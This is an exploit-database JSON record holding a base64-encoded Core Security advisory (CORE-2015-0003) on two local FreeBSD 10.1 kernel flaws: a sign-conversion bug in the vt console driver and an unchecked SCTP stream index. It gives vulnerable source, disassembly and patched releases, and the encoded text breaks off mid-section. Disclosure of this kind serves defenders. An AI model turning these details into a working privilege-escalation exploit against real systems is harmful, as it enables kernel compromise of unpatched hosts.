{
    "source": "exploit-database", 
    "exploit": "Q29yZSBTZWN1cml0eSAtIENvcmVsYWJzIEFkdmlzb3J5DQpodHRwOi8vY29yZWxhYnMuY29yZXNlY3VyaXR5LmNvbS8NCg0KRnJlZUJTRCBLZXJuZWwgTXVsdGlwbGUgVnVsbmVyYWJpbGl0aWVzDQoNCg0KDQoxLiAqQWR2aXNvcnkgSW5mb3JtYXRpb24qDQoNClRpdGxlOiBGcmVlQlNEIEtlcm5lbCBNdWx0aXBsZSBWdWxuZXJhYmlsaXRpZXMNCkFkdmlzb3J5IElEOiBDT1JFLTIwMTUtMDAwMw0KQWR2aXNvcnkgVVJMOiBodHRwOi8vd3d3LmNvcmVzZWN1cml0eS5jb20vY29udGVudC9mcmVlYnNkLWtlcm5lbC1tdWx0aXBsZS12dWxuZXJhYmlsaXRpZXMNCkRhdGUgcHVibGlzaGVkOiAyMDE1LTAxLTI3DQpEYXRlIG9mIGxhc3QgdXBkYXRlOiAyMDE1LTAxLTI3DQpWZW5kb3JzIGNvbnRhY3RlZDogRnJlZUJTRA0KUmVsZWFzZSBtb2RlOiBDb29yZGluYXRlZCByZWxlYXNlDQoNCg0KDQoyLiAqVnVsbmVyYWJpbGl0eSBJbmZvcm1hdGlvbioNCg0KQ2xhc3M6IFVuc2lnbmVkIHRvIFNpZ25lZCBDb252ZXJzaW9uIEVycm9yIFtDV0UtMTk2XSwgSW1wcm9wZXIgVmFsaWRhdGlvbiBvZiBBcnJheSBJbmRleCBbQ1dFLTEyOV0sIEltcHJvcGVyIFZhbGlkYXRpb24gb2YgQXJyYXkgSW5kZXggW0NXRS0xMjldDQpJbXBhY3Q6IENvZGUgZXhlY3V0aW9uLCBEZW5pYWwgb2Ygc2VydmljZQ0KUmVtb3RlbHkgRXhwbG9pdGFibGU6IE5vDQpMb2NhbGx5IEV4cGxvaXRhYmxlOiBZZXMNCkNWRSBOYW1lOiBDVkUtMjAxNC0wOTk4LCBDVkUtMjAxNC04NjEyLCBDVkUtMjAxNC04NjEyDQoNCg0KDQozLiAqVnVsbmVyYWJpbGl0eSBEZXNjcmlwdGlvbioNCg0KDQogICAgRnJlZUJTRCBpcyBhbiBhZHZhbmNlZCBjb21wdXRlciBvcGVyYXRpbmcgc3lzdGVtIHVzZWQgdG8gcG93ZXIgbW9kZXJuIHNlcnZlcnMsIGRlc2t0b3BzIGFuZCBlbWJlZGRlZCBwbGF0Zm9ybXMuIA0KICAgIEEgbGFyZ2UgY29tbXVuaXR5IGhhcyBjb250aW51YWxseSBkZXZlbG9wZWQgaXQgZm9yIG1vcmUgdGhhbiB0aGlydHkgeWVhcnMuIEl0cyBhZHZhbmNlZCBuZXR3b3JraW5nLCANCiAgICBzZWN1cml0eSBhbmQgc3RvcmFnZSBmZWF0dXJlcyBoYXZlIG1hZGUgRnJlZUJTRCB0aGUgcGxhdGZvcm0gb2YgY2hvaWNlIGZvciBtYW55IG9mIHRoZSBidXNpZXN0IHdlYiBzaXRlcyANCiAgICBhbmQgbW9zdCBwZXJ2YXNpdmUgZW1iZWRkZWQgbmV0d29ya2luZyBhbmQgc3RvcmFnZSBkZXZpY2VzLg0KICAgDQoNCg0KICAgIE11bHRpcGxlIHZ1bG5lcmFiaWxpdGllcyBoYXZlIGJlZW4gZm91bmQgaW4gdGhlIEZyZWVCU0Qga2VybmVsIGNvZGUgdGhhdCBpbXBsZW1lbnRzIA0KICAgIHRoZSB2dCBjb25zb2xlIGRyaXZlciAocHJldmlvdXNseSBrbm93biBhcyBOZXdjb25zKSBhbmQgdGhlIGNvZGUgdGhhdCBpbXBsZW1lbnRzIFNDVFAgc29ja2V0cy4NCiAgICBUaGVzZSB2dWxuZXJhYmlsaXRpZXMgY291bGQgYWxsb3cgbG9jYWwgdW5wcml2aWxlZ2VkIGF0dGFja2VycyB0byBkaXNjbG9zZSBrZXJuZWwgbWVtb3J5IGNvbnRhaW5pbmcgDQogICAgc2Vuc2l0aXZlIGluZm9ybWF0aW9uLCBjcmFzaCB0aGUgc3lzdGVtLCBhbmQgZXhlY3V0ZSBhcmJpdHJhcnkgY29kZSB3aXRoIHN1cGVydXNlciBwcml2aWxlZ2VzLg0KICAgDQoNCg0KNC4gKlZ1bG5lcmFibGUgcGFja2FnZXMqDQoNCiAgIC4gRnJlZUJTRCAxMC4xLVJFTEVBU0UuDQogICANCk90aGVyIHZlcnNpb25zIG1heSBiZSBhZmZlY3RlZCB0b28gYnV0IHRoZXkgd2VyZSBubyBjaGVja2VkLg0KDQoNCjUuICpOb24tdnVsbmVyYWJsZSBwYWNrYWdlcyoNCg0KICAgLiBGcmVlQlNEIDEwLjEtUkVMRU5HLg0KDQo2LiAqVmVuZG9yIEluZm9ybWF0aW9uLCBTb2x1dGlvbnMgYW5kIFdvcmthcm91bmRzKg0KDQoNClRoZSBGcmVlQlNEIHRlYW0gaGFzIHJlbGVhc2VkIHBhdGNoZXMgZm9yIHRoZSByZXBvcnRlZCB2dWxuZXJhYmlsaXRpZXMuIFlvdSBzaG91bGQgdXBncmFkZSB0byBGcmVlQlNEIDEwLjEtUkVMRU5HIG9yIG9uZSBvZiB0aGUgZm9sbG93aW5nIHJlbGVhc2VzOg0KICAgIA0KDQogICAuICBzdGFibGUvMTAsIDEwLjEtU1RBQkxFIA0KICAgLiAgcmVsZW5nLzEwLjEsIDEwLjEtUkVMRUFTRS1wNSANCiAgIC4gIHJlbGVuZy8xMC4wLCAxMC4wLVJFTEVBU0UtcDE3IA0KICAgLiAgc3RhYmxlLzksIDkuMy1TVEFCTEUgDQogICAuICByZWxlbmcvOS4zLCA5LjMtUkVMRUFTRS1wOSANCiAgIC4gIHN0YWJsZS84LCA4LjQtU1RBQkxFIA0KICAgLiAgcmVsZW5nLzguNCwgOC40LVJFTEVBU0UtcDIzIA0KDQpUaGUgdmVuZG9yIHB1Ymxpc2ggYSBzZWN1cml0eSBBZHZpc29yeSB0aGF0IGNhbiBiZSBhY2Nlc3NlZCBoZXJlWzZdLiANCg0KDQo3LiAqQ3JlZGl0cyoNCg0KVGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBkaXNjb3ZlcmVkIGFuZCByZXNlYXJjaGVkIGJ5IEZyYW5jaXNjbyBGYWxjb24gZnJvbSBDb3JlIEV4cGxvaXQgV3JpdGVycyBUZWFtLiBUaGUgcHVibGljYXRpb24gb2YgdGhpcyBhZHZpc29yeSB3YXMgY29vcmRpbmF0ZWQgYnkgSm9hcXVpbiBSb2RyaWd1ZXogVmFyZWxhIGZyb20gQ29yZSBBZHZpc29yaWVzIFRlYW0uIA0KICANCg0KDQo4LiAqVGVjaG5pY2FsIERlc2NyaXB0aW9uIC8gUHJvb2Ygb2YgQ29uY2VwdCBDb2RlKg0KDQoNCjguMS4gKkZyZWVCU0QgdnQgRHJpdmVyIFZUX1dBSVRBQ1RJVkUgU2lnbiBDb252ZXJzaW9uIFZ1bG5lcmFiaWxpdHkqDQoNCltDVkUtMjAxNC0wOTk4XQ0KRnJlZUJTRCAxMC4xLVJFTEVBU0UgYWRkZWRbMV0gdGhlICd2dCg0KSdbMl0gY29uc29sZSBkcml2ZXIgKHByZXZpb3VzbHkga25vd24gYXMgTmV3Y29uc1szXSkuIFRoaXMgbmV3IGNvbnNvbGUgZHJpdmVyIGNhbiBiZSBlbmFibGVkIGJ5IGFkZGluZyB0aGUgbGluZSAna2Vybi52dHk9dnQnIHRvIHRoZSAnL2Jvb3QvbG9hZGVyLmNvbmYnIGZpbGUgYW5kIHRoZW4gcmVib290aW5nIHRoZSBzeXN0ZW0uDQoNClRoZSB2dCBjb25zb2xlIGRyaXZlciBpcyBwcm9uZSB0byBhIHNpZ24gY29udmVyc2lvbiBlcnJvciB3aGVuIGhhbmRsaW5nIHRoZSAnVlRfV0FJVEFDVElWRScgaW9jdGwgbWVzc2FnZSwgd2hpY2ggY2FuIGJlIHVsdGltYXRlbHkgbGV2ZXJhZ2VkIGJ5IGEgbG9jYWwgdW5wcml2aWxlZ2VkIGF0dGFja2VyIHRvIG1ha2UgdGhlIGtlcm5lbCBhY2Nlc3MgYW4gYXJyYXkgb3V0c2lkZSBvZiBpdHMgYm91bmRhcmllcy4NCg0KVGhlIHZ0IGNvbnNvbGUgZHJpdmVyIHByb3ZpZGVzIG11bHRpcGxlIHZpcnR1YWwgdGVybWluYWxzLCB3aGljaCBhcmUgbWFwcGVkIHRvIHRoZSAnL2Rldi90dHl2KicgZGV2aWNlIG5vZGVzLiBBIHVzZXIgY2FuIHNlbmQgbWVzc2FnZXMgdG8gdGhlIHZ0IGRyaXZlciBieSBvcGVuaW5nIHRoZSAnL2Rldi90dHl2KicgZGV2aWNlIG5vZGUgYmVsb25naW5nIHRvIGhpcyB2aXJ0dWFsIHRlcm1pbmFsIGFuZCB0aGVuIHVzaW5nIHRoZSAnaW9jdGwnIHN5c3RlbSBjYWxsLg0KDQpUaGUgZnVuY3Rpb24gJ3Z0dGVybV9pb2N0bCcgaW4gJ3N5cy9kZXYvdnQvdnRfY29yZS5jJyBoYW5kbGVzIGlvY3RsIG1lc3NhZ2VzIHNlbnQgdG8gdGhlIHZ0IGRyaXZlci4gT25lIG9mIHRoZSBzdXBwb3J0ZWQgbWVzc2FnZXMgaXMgY2FsbGVkICdWVF9XQUlUQUNUSVZFJzoNCg0KDQovLS0tLS0NCnN0YXRpYyBpbnQNCnZ0dGVybV9pb2N0bChzdHJ1Y3QgdGVybWluYWwgKnRtLCB1X2xvbmcgY21kLCBjYWRkcl90IGRhdGEsDQogICAgc3RydWN0IHRocmVhZCAqdGQpDQp7DQogICAgaW50IGVycm9yLCBpLCBzOw0KICAgIFsuLi5dDQogICAgc3dpdGNoIChjbWQpIHsNCiAgICBbLi4uXQ0KICAgIGNhc2UgVlRfV0FJVEFDVElWRToNCiAgICAgICAgZXJyb3IgPSAwOw0KDQogICAgICAgIGkgPSAqKHVuc2lnbmVkIGludCAqKWRhdGE7DQogICAgICAgIGlmIChpID4gVlRfTUFYV0lORE9XUykNCiAgICAgICAgICAgIHJldHVybiAoRUlOVkFMKTsNCiAgICAgICAgaWYgKGkgIT0gMCkNCiAgICAgICAgICAgIHZ3ID0gdmQtPnZkX3dpbmRvd3NbaSAtIDFdOw0KICAgIFsuLi5dDQogICAgIA0KLS0tLS0vDQoNCkFzIHNob3duIGFib3ZlLCB3aGVuIGhhbmRsaW5nIHRoZSAnVlRfV0FJVEFDVElWRScgaW9jdGwgbWVzc2FnZSwgdGhlICAnZGF0YScgaW5wdXQgYnVmZmVyICh3aGljaCBpcyBmdWxseSBjb250cm9sbGVkIGJ5IHRoZSBsb2NhbCB1c2VyKSBpcyBjYXN0ZWQgYXMgJyh1bnNpZ25lZCBpbnQgKiknIGluIG9yZGVyIHRvIHJlYWQgYW4gJ3Vuc2lnbmVkIGludCcgZnJvbSB0aGUgaW5wdXQgZGF0YTsgaG93ZXZlciwgdGhlIHJlYWQgdmFsdWUgaXMgc3RvcmVkIGluIHRoZSAnaScgdmFyaWFibGUsIHdoaWNoIGhhcyAqc2lnbmVkKiB0eXBlICdpbnQnLg0KDQpUaGlzIHNpZ24gY29udmVyc2lvbiBlcnJvciB3aWxsIG1ha2UgcG9zc2libGUgZm9yIGEgbG9jYWwgYXR0YWNrZXIgdG8gYnlwYXNzIHRoZSBzdWJzZXF1ZW50IGJvdW5kYXJ5IGNoZWNrIHRoYXQgdHJpZXMgdG8gZW5zdXJlIHRoYXQgJ2knIGlzIG5vdCBncmVhdGVyIHRoYW4gJ1ZUX01BWFdJTkRPV1MnIGJlZm9yZSB1c2luZyBpdCBhcyBhbiBpbmRleCB0byBhY2Nlc3MgdGhlICd2ZC0+dmRfd2luZG93cycgYXJyYXkuIFRoaXMgZmxhdyBjYW4gYmUgbGV2ZXJhZ2VkIGJ5IGEgbG9jYWwgYXR0YWNrZXIgdG8gbWFrZSB0aGUga2VybmVsIGFjY2VzcyB0aGUgJ3ZkLT52ZF93aW5kb3dzJyBhcnJheSBvdXRzaWRlIG9mIGl0cyBib3VuZGFyaWVzLg0KDQpUaGUgZm9sbG93aW5nIGRpc2Fzc2VtYmx5IHNuaXBwZXQgcmVwcmVzZW50cyB0aGUgdnVsbmVyYWJsZSBjb2RlIGluIHRoZSBGcmVlQlNEIGtlcm5lbCBiaW5hcnkgKCcvYm9vdC9rZXJuZWwva2VybmVsJyk6DQoNCg0KLy0tLS0tDQp2dHRlcm1faW9jdGwrMTMwNiBsb2NfQzA5QjI1MDY6ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOyBDT0RFIFhSRUY6IHZ0dGVybV9pb2N0bCtENkNqDQp2dHRlcm1faW9jdGwrMTMwNiAgICAgICAgICAgICAgICAgY21wICAgICBlc2ksIDIwMDQ3NjA2aCAgICAgICAgOyBjYXNlIFZUX1dBSVRBQ1RJVkU6DQp2dHRlcm1faW9jdGwrMTMwQyAgICAgICAgICAgICAgICAgbW92ICAgICBlY3gsIGVkeCAgICAgICAgICAgICAgOyBlY3ggPSB2ZC0+dmRfd2luZG93cw0KdnR0ZXJtX2lvY3RsKzEzMEUgICAgICAgICAgICAgICAgIG1vdiAgICAgZWF4LCBlYngNCnZ0dGVybV9pb2N0bCsxMzEwICAgICAgICAgICAgICAgICBqbnogICAgIGxvY19DMDlCMjc1Qg0KdnR0ZXJtX2lvY3RsKzEzMTYgICAgICAgICAgICAgICAgIG1vdiAgICAgZWF4LCBbZWF4XSAgICAgICAgICAgIDsgaSA9ICoodW5zaWduZWQgaW50ICopZGF0YTsNCnZ0dGVybV9pb2N0bCsxMzE4ICAgICAgICAgICAgICAgICBjbXAgICAgIGVheCwgMENoICAgICAgICAgICAgICA7IGlmIChpID4gVlRfTUFYV0lORE9XUykuLi4NCnZ0dGVybV9pb2N0bCsxMzFCICAgICAgICAgICAgICAgICBtb3YgICAgIGVkaSwgMTZoICAgICAgICAgIA0KdnR0ZXJtX2lvY3RsKzEzMjAgICAgICAgICAgICAgICAgIGpnICAgICAgbG9jX0MwOUIyNzYwICAgICAgICAgIDsgKioqIHNpZ25lZCBjb21wYXJpc29uIQ0KdnR0ZXJtX2lvY3RsKzEzMjYgICAgICAgICAgICAgICAgIHRlc3QgICAgZWF4LCBlYXggICAgICAgICAgICAgIDsgaWYgKGkgIT0gMCkuLi4NCnZ0dGVybV9pb2N0bCsxMzI4ICAgICAgICAgICAgICAgICBqeiAgICAgIHNob3J0IGxvY19DMDlCMjUzMQ0KdnR0ZXJtX2lvY3RsKzEzMkEgICAgICAgICAgICAgICAgIG1vdiAgICAgZWF4LCBbZWN4K2VheCo0LTRdICAgIDsgKioqKiB2dyA9IHZkLT52ZF93aW5kb3dzW2kgLSAxXTsgLS0tPiBhY2Nlc3MgdmQtPnZkX3dpbmRvd3Mgb3V0c2lkZSBvZiBpdHMgYm91bmRhcmllcw0KdnR0ZXJtX2lvY3RsKzEzMkUgICAgICAgICAgICAgICAgIG1vdiAgICAgW2VicCt2YXJfMzBdLCBlYXgNCiAgICAgDQotLS0tLS8NCg0KDQo4LjIuICpGcmVlQlNEIFNDVFAgU29ja2V0IFNDVFBfU1NfVkFMVUUgTWVtb3J5IENvcnJ1cHRpb24gVnVsbmVyYWJpbGl0eSoNCg0KW0NWRS0yMDE0LTg2MTJdDQpGcmVlQlNEIGltcGxlbWVudHMgdGhlIFN0cmVhbSBDb250cm9sIFRyYW5zbWlzc2lvbiBQcm90b2NvbCAoU0NUUCkuWzRdLiBBIHVzZXJsYW5kIGFwcGxpY2F0aW9uIGNhbiB1c2UgdGhlICdnZXRzb2Nrb3B0L3NldHNvY2tvcHQnIHN5c3RlbSBjYWxscyBpbiBvcmRlciB0byBtYW5pcHVsYXRlIHRoZSBvcHRpb25zIGFzc29jaWF0ZWQgd2l0aCBhbiBTQ1RQIHNvY2tldC4NCg0KVGhlIEZyZWVCU0Qga2VybmVsIGlzIHByb25lIHRvIGEgbWVtb3J5IGNvcnJ1cHRpb24gdnVsbmVyYWJpbGl0eSB3aGVuIHNldHRpbmcgdGhlICdTQ1RQX1NTX1ZBTFVFJyBTQ1RQIHNvY2tldCBvcHRpb24gdmlhIHRoZSAnc2V0c29ja29wdCcgc3lzdGVtIGNhbGwuIFRoaXMgdnVsbmVyYWJpbGl0eSBjYW4gYmUgbGV2ZXJhZ2VkIGJ5IGEgbG9jYWwgdW5wcml2aWxlZ2VkIGF0dGFja2VyIHRvIGNvcnJ1cHQga2VybmVsIG1lbW9yeSB3aXRoIGFuIGFyYml0cmFyeSAxNi1iaXQgdmFsdWUuDQoNClRoZSBoYW5kbGluZyBvZiB0aGUgJ3NldHNvY2tvcHQnIHN5c3RlbSBjYWxsIGF0IHRoZSBTQ1RQIGxldmVsIGlzIHBlcmZvcm1lZCBieSB0aGUgZnVuY3Rpb24gJ3NjdHBfc2V0b3B0JyBbZmlsZSAnc3lzL25ldGluZXQvc2N0cF91c2VycmVxLmMnXToNCg0KDQovLS0tLS0NCnN0YXRpYyBpbnQNCnNjdHBfc2V0b3B0KHN0cnVjdCBzb2NrZXQgKnNvLCBpbnQgb3B0bmFtZSwgdm9pZCAqb3B0dmFsLCBzaXplX3Qgb3B0c2l6ZSwNCiAgICB2b2lkICpwKQ0Kew0KICAgIFsuLi5dDQogICAgc3dpdGNoIChvcHRuYW1lKSB7DQogICAgICAgIFsuLi5dDQogICAgICAgIGNhc2UgU0NUUF9TU19WQUxVRToNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBzdHJ1Y3Qgc2N0cF9zdHJlYW1fdmFsdWUgKmF2Ow0KDQogICAgICAgICAgICAgICAgU0NUUF9DSEVDS19BTkRfQ0FTVChhdiwgb3B0dmFsLCBzdHJ1Y3Qgc2N0cF9zdHJlYW1fdmFsdWUsIG9wdHNpemUpOw0KICAgICAgICAgICAgICAgIFNDVFBfRklORF9TVENCKGlucCwgc3RjYiwgYXYtPmFzc29jX2lkKTsNCiAgICAgICAgICAgICAgICBpZiAoc3RjYikgew0KICAgICAgICAgICAgICAgICAgICBpZiAoc3RjYi0+YXNvYy5zc19mdW5jdGlvbnMuc2N0cF9zc19zZXRfdmFsdWUoc3RjYiwgJnN0Y2ItPmFzb2MsICZzdGNiLT5hc29jLnN0cm1vdXRbYXYtPnN0cmVhbV9pZF0sDQogICAgICAgICAgICAgICAgICAgICAgICBhdi0+c3RyZWFtX3ZhbHVlKSA8IDApIHsNCiAgICAgDQotLS0tLS8NCg0KQXMgc2hvd24gYWJvdmUsIHdoZW4gaGFuZGxpbmcgdGhlICdTQ1RQX1NTX1ZBTFVFJyBzb2NrZXQgb3B0aW9uLCB0aGUgJ29wdHZhbCcgb3B0aW9uIHZhbHVlICh3aGljaCBpcyBmdWxseSBjb250cm9sbGVkIGJ5IHRoZSBsb2NhbCB1c2VyKSwgaXMgY2FzdGVkIHRvIHRoZSAnc3RydWN0IHNjdHBfc3RyZWFtX3ZhbHVlIConIHR5cGUgYW5kIHN0b3JlZCBpbnRvIHRoZSAnYXYnIHZhcmlhYmxlIGJ5IHVzaW5nIHRoZSAnU0NUUF9DSEVDS19BTkRfQ0FTVCcgbWFjcm8uIEFmdGVyIHRoYXQsIGlmIHRoZSAnc2N0YicgcG9pbnRlciBpcyBub3QgJ05VTEwnIChjb25kaXRpb24gdGhhdCBjYW4gYmUgYWNoaWV2ZWQgYnkgaGF2aW5nIHRoZSBTQ1RQIHNvY2tldCBpbiBhICpjb25uZWN0ZWQqIHN0YXRlKSwgdGhlbiB0aGUgJ3N0Y2ItPmFzb2Muc3NfZnVuY3Rpb25zLnNjdHBfc3Nfc2V0X3ZhbHVlJyBmdW5jdGlvbiBwb2ludGVyIGlzIGNhbGxlZC4gVGhlIHRoaXJkIGFyZ3VtZW50IGZvciB0aGlzIGZ1bmN0aW9uIGlzICcmc3RjYi0+YXNvYy5zdHJtb3V0W2F2LT5zdHJlYW1faWRdJy4gQXMgY2FuIGJlIHNlZW4sIHRoZSB1bnN0cnVzdGVkICdhdi0+c3RyZWFtX2lkJyB2YWx1ZSAod2hpY2ggaXMgZnVsbHkgY29udHJvbGxlZCBieSB0aGUgbG9jYWwgYXR0YWNrZXIpIGlzIHVzZWQgYXMgYW4gaW5kZXggd2l0aGluIHRoZSAnc3RjYi0+YXNvYy5zdHJtb3V0JyBhcnJheSB3aXRob3V0IHByb3Blcmx5IGNoZWNraW5nIGlmIGl0J3Mgd2l0aGluIHRoZSBib3VuZHMgb2YgdGhlIGFycmF5Lg0KDQpIb3dldmVyLCBub3RlIHRoYXQgdGhlIG1lbW9yeSBhZGRyZXNzIGNhbGN1bGF0ZWQgdXNpbmcgdGhlIHVudHJ1c3RlZCBpbmRleCBpcyBub3QgZGVyZWZlcmVuY2VkIHlldDsganVzdCB0aGUgY2FsY3VsYXRlZCBhZGRyZXNzIGlzIHBhc3NlZCBhcyBhbiBhcmd1bWVudCB0byB0aGUgZnVuY3Rpb24sIHNvIHRoZXJlIGlzIHN0aWxsIG5vIG1lbW9yeSBhY2Nlc3MgYXQgdGhpcyBwb2ludC4NCg0KJ3N0Y2ItPmFzb2Muc3NfZnVuY3Rpb25zJyBoYXMgdHlwZSAnc3RydWN0IHNjdHBfc3NfZnVuY3Rpb25zJywgd2hpY2ggaXMgYSBzdHJ1Y3QgZGVmaW5lZCBpbiB0aGUgZmlsZSAnc3lzL25ldGluZXQvc2N0cF9zdHJ1Y3RzLmgnIGNvbnRhaW5pbmcgc2V2ZXJhbCBmdW5jdGlvbiBwb2ludGVycy4gT25lIG9mIGl0cyBtZW1iZXJzIGlzICdzY3RwX3NzX3NldF92YWx1ZScsIHdoaWNoIGlzIHRoZSBvbmUgYmVpbmcgY2FsbGVkIHdoZW4gaGFuZGxpbmcgdGhlICdTQ1RQX1NTX1ZBTFVFJyBzb2NrZXQgb3B0aW9uOg0KDQoNCi8tLS0tLQ0KLyoNCiAqIFJTIC0gU3RydWN0dXJlIHRvIGhvbGQgZnVuY3Rpb24gcG9pbnRlcnMgdG8gdGhlIGZ1bmN0aW9ucyByZXNwb25zaWJsZQ0KICogZm9yIHN0cmVhbSBzY2hlZHVsaW5nLg0KICovDQpzdHJ1Y3Qgc2N0cF9zc19mdW5jdGlvbnMgew0KICAgIHZvaWQgKCpzY3RwX3NzX2luaXQpIChzdHJ1Y3Qgc2N0cF90Y2IgKnN0Y2IsIHN0cnVjdCBzY3RwX2Fzc29jaWF0aW9uICphc29jLA0KICAgICAgICAgICAgIGludCBob2xkc19sb2NrKTsNCiAgICB2b2lkICgqc2N0cF9zc19jbGVhcikgKHN0cnVjdCBzY3RwX3RjYiAqc3RjYiwgc3RydWN0IHNjdHBfYXNzb2NpYXRpb24gKmFzb2MsDQogICAgICAgICAgICAgaW50IGNsZWFyX3ZhbHVlcywgaW50IGhvbGRzX2xvY2spOw0KICAgIHZvaWQgKCpzY3RwX3NzX2luaXRfc3RyZWFtKSAoc3RydWN0IHNjdHBfc3RyZWFtX291dCAqc3RycSwgc3RydWN0IHNjdHBfc3RyZWFtX291dCAqd2l0aF9zdHJxKTsNCiAgICB2b2lkICgqc2N0cF9zc19hZGRfdG9fc3RyZWFtKSAoc3RydWN0IHNjdHBfdGNiICpzdGNiLCBzdHJ1Y3Qgc2N0cF9hc3NvY2lhdGlvbiAqYXNvYywNCiAgICAgICAgICAgICBzdHJ1Y3Qgc2N0cF9zdHJlYW1fb3V0ICpzdHJxLCBzdHJ1Y3Qgc2N0cF9zdHJlYW1fcXVldWVfcGVuZGluZyAqc3AsIGludCBob2xkc19sb2NrKTsNCiAgICBpbnQgKCpzY3RwX3NzX2lzX2VtcHR5KSAoc3RydWN0IHNjdHBfdGNiICpzdGNiLCBzdHJ1Y3Qgc2N0cF9hc3NvY2lhdGlvbiAqYXNvYyk7DQogICAgdm9pZCAoKnNjdHBfc3NfcmVtb3ZlX2Zyb21fc3RyZWFtKSAoc3RydWN0IHNjdHBfdGNiICpzdGNiLCBzdHJ1Y3Qgc2N0cF9hc3NvY2lhdGlvbiAqYXNvYywNCiAgICAgICAgICAgICBzdHJ1Y3Qgc2N0cF9zdHJlYW1fb3V0ICpzdHJxLCBzdHJ1Y3Qgc2N0cF9zdHJlYW1fcXVldWVfcGVuZGluZyAqc3AsIGludCBob2xkc19sb2NrKTsNCiAgICBzdHJ1Y3Qgc2N0cF9zdHJlYW1fb3V0ICooKnNjdHBfc3Nfc2VsZWN0X3N0cmVhbSkgKHN0cnVjdCBzY3RwX3RjYiAqc3RjYiwNCiAgICAgICAgICAgICAgICAgICAgICAgIHN0cnVjdCBzY3RwX25ldHMgKm5ldCwgc3RydWN0IHNjdHBfYXNzb2NpYXRpb24gKmFzb2MpOw0KICAgIHZvaWQgKCpzY3RwX3NzX3NjaGVkdWxlZCkgKHN0cnVjdCBzY3RwX3RjYiAqc3RjYiwgc3RydWN0IHNjdHBfbmV0cyAqbmV0LA0KICAgICAgICAgICAgIHN0cnVjdCBzY3RwX2Fzc29jaWF0aW9uICphc29jLCBzdHJ1Y3Qgc2N0cF9zdHJlYW1fb3V0ICpzdHJxLCBpbnQgbW92ZWRfaG93X211Y2gpOw0KICAgIHZvaWQgKCpzY3RwX3NzX3BhY2tldF9kb25lKSAoc3RydWN0IHNjdHBfdGNiICpzdGNiLCBzdHJ1Y3Qgc2N0cF9uZXRzICpuZXQsDQogICAgICAgICAgICAgc3RydWN0IHNjdHBfYXNzb2NpYXRpb24gKmFzb2MpOw0KICAgIGludCAoKnNjdHBfc3NfZ2V0X3ZhbHVlKSAoc3RydWN0IHNjdHBfdGNiICpzdGNiLCBzdHJ1Y3Qgc2N0cF9hc3NvY2lhdGlvbiAqYXNvYywNCiAgICAgICAgICAgIHN0cnVjdCBzY3RwX3N0cmVhbV9vdXQgKnN0cnEsIHVpbnQxNl90ICogdmFsdWUpOw0KICAgIGludCAoKnNjdHBfc3Nfc2V0X3ZhbHVlKSAoc3RydWN0IHNjdHBfdGNiICpzdGNiLCBzdHJ1Y3Qgc2N0cF9hc3NvY2lhdGlvbiAqYXNvYywNCiAgICAgICAgICAgIHN0cnVjdCBzY3RwX3N0cmVhbV9vdXQgKnN0cnEsIHVpbnQxNl90IHZhbHVlKTsNCn07DQogICAgIA0KLS0tLS0vDQoNClRoZSBmaWxlICdzeXMvbmV0aW5ldC9zY3RwX3NzX2Z1bmN0aW9ucy5jJyBkZWZpbmVzIGFuIGFycmF5IGNhbGxlZCAnc2N0cF9zc19mdW5jdGlvbnMnOyBlYWNoIGVsZW1lbnQgb2YgdGhpcyBhcnJheSBoYXMgdHlwZSAnc3RydWN0IHNjdHBfc3NfZnVuY3Rpb25zJyBhbmQgZGVmaW5lcyBhIHNldCBvZiBmdW5jdGlvbiBwb2ludGVycyBzdWl0YWJsZSBmb3IgZGlmZmVyZW50IFNDVFAgc29ja2V0IG9wdGlvbnM6DQoNCg0KLy0tLS0tDQpzdHJ1Y3Qgc2N0cF9zc19mdW5jdGlvbnMgc2N0cF9zc19mdW5jdGlvbnNbXSA9IHsNCi8qIFNDVFBfU1NfREVGQVVMVCAqLw0KICAgIHsNCiAgICAgICAgLnNjdHBfc3NfaW5pdCA9IHNjdHBfc3NfZGVmYXVsdF9pbml0LA0KICAgICAgICAuc2N0cF9zc19jbGVhciA9IHNjdHBfc3NfZGVmYXVsdF9jbGVhciwNCiAgICAgICAgLnNjdHBfc3NfaW5pdF9zdHJlYW0gPSBzY3RwX3NzX2RlZmF1bHRfaW5pdF9zdHJlYW0sDQogICAgICAgIC5zY3RwX3NzX2FkZF90b19zdHJlYW0gPSBzY3RwX3NzX2RlZmF1bHRfYWRkLA0KICAgICAgICAuc2N0cF9zc19pc19lbXB0eSA9IHNjdHBfc3NfZGVmYXVsdF9pc19lbXB0eSwNCiAgICAgICAgLnNjdHBfc3NfcmVtb3ZlX2Zyb21fc3RyZWFtID0gc2N0cF9zc19kZWZhdWx0X3JlbW92ZSwNCiAgICAgICAgLnNjdHBfc3Nfc2VsZWN0X3N0cmVhbSA9IHNjdHBfc3NfZGVmYXVsdF9zZWxlY3QsDQogICAgICAgIC5zY3RwX3NzX3NjaGVkdWxlZCA9IHNjdHBfc3NfZGVmYXVsdF9zY2hlZHVsZWQsDQogICAgICAgIC5zY3RwX3NzX3BhY2tldF9kb25lID0gc2N0cF9zc19kZWZhdWx0X3BhY2tldF9kb25lLA0KICAgICAgICAuc2N0cF9zc19nZXRfdmFsdWUgPSBzY3RwX3NzX2RlZmF1bHRfZ2V0X3ZhbHVlLA0KICAgICAgICAuc2N0cF9zc19zZXRfdmFsdWUgPSBzY3RwX3NzX2RlZmF1bHRfc2V0X3ZhbHVlDQogICAgfSwNCi8qIFNDVFBfU1NfUk9VTkRfUk9CSU4gKi8NCiAgICB7DQogICAgICAgIC5zY3RwX3NzX2luaXQgPSBzY3RwX3NzX2RlZmF1bHRfaW5pdCwNCiAgICAgICAgLnNjdHBfc3NfY2xlYXIgPSBzY3RwX3NzX2RlZmF1bHRfY2xlYXIsDQogICAgICAgIC5zY3RwX3NzX2luaXRfc3RyZWFtID0gc2N0cF9zc19kZWZhdWx0X2luaXRfc3RyZWFtLA0KICAgICAgICAuc2N0cF9zc19hZGRfdG9fc3RyZWFtID0gc2N0cF9zc19ycl9hZGQsDQogICAgICAgIC5zY3RwX3NzX2lzX2VtcHR5ID0gc2N0cF9zc19kZWZhdWx0X2lzX2VtcHR5LA0KICAgICAgICAuc2N0cF9zc19yZW1vdmVfZnJvbV9zdHJlYW0gPSBzY3RwX3NzX2RlZmF1bHRfcmVtb3ZlLA0KICAgICAgICAuc2N0cF9zc19zZWxlY3Rfc3RyZWFtID0gc2N0cF9zc19kZWZhdWx0X3NlbGVjdCwNCiAgICAgICAgLnNjdHBfc3Nfc2NoZWR1bGVkID0gc2N0cF9